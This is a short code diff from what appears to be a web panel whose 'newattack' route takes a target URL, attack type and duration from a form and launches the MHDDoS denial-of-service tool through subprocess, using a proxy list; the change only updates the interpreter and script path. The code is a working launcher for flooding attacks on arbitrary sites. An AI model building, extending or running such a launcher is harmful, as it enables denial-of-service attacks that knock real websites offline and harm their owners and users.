@@ -63,7 +63,7 @@ def newattack():
         time = request.form["time"]
         # startinng the attack 
         arguments = [f"{type_attack}", f"{url}", "0", "100", "proxies.txt", f"{time}"]
-        command = ["python", "data/mhddos/mhddos.py"] + arguments
+        command = ["python3", "data/mhddos/start.py"] + arguments
         x = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         
         out = x.stdout.read()
